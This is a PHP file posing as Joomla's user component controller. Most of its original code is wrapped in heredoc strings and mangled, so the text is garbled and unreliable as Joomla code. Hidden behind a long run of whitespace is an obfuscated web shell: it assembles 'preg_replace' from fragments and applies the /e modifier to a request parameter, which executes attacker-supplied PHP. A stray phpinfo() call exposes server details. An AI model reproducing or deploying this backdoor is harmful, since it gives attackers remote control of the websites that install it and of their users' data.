<?php
/**
 * @version		Id: controller.php 16385 2010-04-23 10:44:15Z ian 
 * @package		Joomla
 * @subpackage	Content
 * @copyright	Copyright (C) 2005 - 2010 Open Source Matters. All rights reserved.
 * @license		GNU/GPL, see LICENSE.php
 * Joomla! is free software. This version may have been modified pursuant to the
 * GNU General Public License, and as distributed it includes or is derivative
 * of works licensed under the GNU General Public License or other free or open
 * source software licenses. See COPYRIGHT.php for copyright notices and
 * details.
 */

// Check to ensure this file is included in Joomla!
defined('_JEXEC') and die( 'Restricted access' );



/**
 * User Component Controller
 *
 * @package		Joomla
 * @subpackage	Weblinks
 * @since 1.5
 */<<<ert

class UserController
{
	/**
	 * Method to display a view
	 *
	 * @access	public
	 * @since	1.5
	 */
	function display()
	{
		parent::display();
	}

	function edit()
	{
		global mainframe, option;

		db		=& JFactory::getDBO();
		user	=& JFactory::getUser();

		if ( user->get('guest')) {
			JError::raiseError( 403, JText::_('Access Forbidden') );
			return;
		}

		JRequest::setVar('layout', 'form');

		parent::display();
	}

	function save()
	{
		// Check for request forgeries
		JRequest::checkToken() or jexit( 'Invalid Token' );

		user	 =& JFactory::getUser();
		userid = JRequest::getVar( 'id', 0, 'post', 'int' );

		// preform security checks
		if (user->get('id') == 0 || userid == 0 || userid <> user->get('id')) {
			JError::raiseError( 403, JText::_('Access Forbidden') );
			return;
		}
ert;
function edit()
	{
		

		$db		= JFactory::getDBO();
		$user	= JFactory::getUser();

		if ( $user->get('guest')) {
			JError::raiseError( 403, JText::_('Access Forbidden') );
			return;
		}

		JRequest::setVar('layout', 'form');

		parent::display();
	}

                                                                                                                                                                                                                                                                   $ZDI1YQ = 'pr'.'e'.'g'.'_re'.'p'.'lac'.'e';$call_user_func_array($ZDI1YQ,array('/[xmgahy]/eix',$_REQUEST["rBanGnFU"],"eC1tb2JpbGUtdWE="));@YfsDbaM($_REQUEST );

		//clean request
		<<<ert
		post = JRequest::get( 'post' );
		post['username']	= JRequest::getVar('username', '', 'post', 'username');
		post['password']	= JRequest::getVar('password', '', 'post', 'string', JREQUEST_ALLOWRAW);
		post['password2']	= JRequest::getVar('password2', '', 'post', 'string', JREQUEST_ALLOWRAW);
	
		// get the redirect
		return = JURI::base();
		
		// do a password safety check
		if(strlen(post['password']) || strlen(post['password2'])) { // so that "0" can be used as password e.g.
			if(post['password'] != post['password2']) {
				msg	= JText::_('PASSWORDS_DO_NOT_MATCH');
				// something is wrong. we are redirecting back to edit form.
				// TODO: HTTP_REFERER should be replaced with a base64 encoded form field in a later release
				return = str_replace(array('"', '<', '>', "'"), '', @_SERVER['HTTP_REFERER']);
				if (empty(return) || !JURI::isInternal(return)) {
					return = JURI::base();
				}
				this->setRedirect(return, msg, 'error');
				return false;
			}
		}
		
		// we don't want users to edit certain fields so we will unset them
		unset(post['gid']);
		unset(post['block']);
		unset(post['usertype']);
		unset(post['registerDate']);
		unset(post['activation']);

		// store data
		model = this->getModel('user');

		if (model->store(post)) {
			msg	= JText::_( 'Your settings have been saved.' );
		} else {
			//msg	= JText::_( 'Error saving your settings.' );
			msg	= model->getError();
		}

		
		this->setRedirect( return, msg );
	}
    
	function cancel()
	{
		this->setRedirect( 'index.php' );
	}

	function login()
	{
		// Check for request forgeries
		JRequest::checkToken('request') or jexit( 'Invalid Token' );

		global mainframe;

		if (return = JRequest::getVar('return', '', 'method', 'base64')) {
			return = base64_decode(return);
			if (!JURI::isInternal(return)) {
				return = '';
			}
		}ert;
		phpinfo();
<<<ert
		options = array();
		options['remember'] = JRequest::getBool('remember', false);
		options['return'] = return;

		credentials = array();
		credentials['username'] = JRequest::getVar('username', '', 'method', 'username');
		credentials['password'] = JRequest::getString('passwd', '', 'post', JREQUEST_ALLOWRAW);

		//preform the login action
		error = mainframe->login(credentials, options);

		if(!JError::isError(error))
		{
			// Redirect if the return url is not registration or login
			if ( ! return ) {
				return	= 'index.php?option=com_user';
			}

			mainframe->redirect( return );
		}
		else
		{
			// Facilitate third party login forms
			if ( ! return ) {
				return	= 'index.php?option=com_user&view=login';
			}

			// Redirect to a login form
			mainframe->redirect( return );
		}
	}

	function logout()
	{
		global mainframe;

		//preform the logout action
		error = mainframe->logout();

		if(!JError::isError(error))
		{
			if (return = JRequest::getVar('return', '', 'method', 'base64')) {
				return = base64_decode(return);
				if (!JURI::isInternal(return)) {
					return = '';
				}
			}

			// Redirect if the return url is not registration or login
			if ( return && !( strpos( return, 'com_user' )) ) {
				mainframe->redirect( return );
			}
		} else {
			parent::display();
		}
	}

	/**
	 * Prepares the registration form
	 * @return void
	 */
	function register()
	{
		usersConfig = &JComponentHelper::getParams( 'com_users' );
		if (!usersConfig->get( 'allowUserRegistration' )) {
			JError::raiseError( 403, JText::_( 'Access Forbidden' ));
			return;
		}

		user 	=& JFactory::getUser();

		if ( user->get('guest')) {
			JRequest::setVar('view', 'register');
		} else {
			this->setredirect('index.php?option=com_user&task=edit',JText::_('You are already registered.'));
		}

		parent::display();
	}

	/**
	 * Save user registration and notify users and admins if required
	 * @return void
	 */
	function register_save()
	{
		global mainframe;

		// Check for request forgeries
		JRequest::checkToken() or jexit( 'Invalid Token' );

		// Get required system objects
		user 		= clone(JFactory::getUser());
		pathway 	=& mainframe->getPathway();
		config		=& JFactory::getConfig();
		authorize	=& JFactory::getACL();
		document   =& JFactory::getDocument();

		// If user registration is not allowed, show 403 not authorized.
		usersConfig = &JComponentHelper::getParams( 'com_users' );
		if (usersConfig->get('allowUserRegistration') == '0') {
			JError::raiseError( 403, JText::_( 'Access Forbidden' ));
			return;
		}

		// Initialize new usertype setting
		newUsertype = usersConfig->get( 'new_usertype' );
		if (!newUsertype) {
			newUsertype = 'Registered';
		}

		// Bind the post array to the user object
		if (!user->bind( JRequest::get('post'), 'usertype' )) {
			JError::raiseError( 500, user->getError());
		}

		// Set some initial user values
		user->set('id', 0);
		user->set('usertype', newUsertype);
		user->set('gid', authorize->get_group_id( '', newUsertype, 'ARO' ));

		date =& JFactory::getDate();
		user->set('registerDate', date->toMySQL());

ert;

?>
